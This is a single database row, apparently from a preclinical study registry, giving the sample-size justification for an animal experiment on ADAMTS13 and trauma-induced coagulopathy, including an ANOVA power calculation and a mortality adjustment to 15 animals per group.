	(10301,285,'sample_size_calculation_details','\"As multiple questions on the mechanism of the role of ADAMTS13 on TIC are investigated, our sample size is based on the largest number of groups used in a specific comparison of TIC and ADAMTS13 degradation. When the sample size in each of the 8 groups is 10, a one-way analysis of variance will have 80% power to detect at the 5% level a difference in means characterized by a variance of means, V, of 133,984, assuming that the common standard deviation is 25. We estimate 30% mortality in our model, based on previous experiments. Therefore 10\\/0.7 = 15 animals per group will be included. \"','2022-03-31 13:24:07','2022-03-31 13:24:07'),
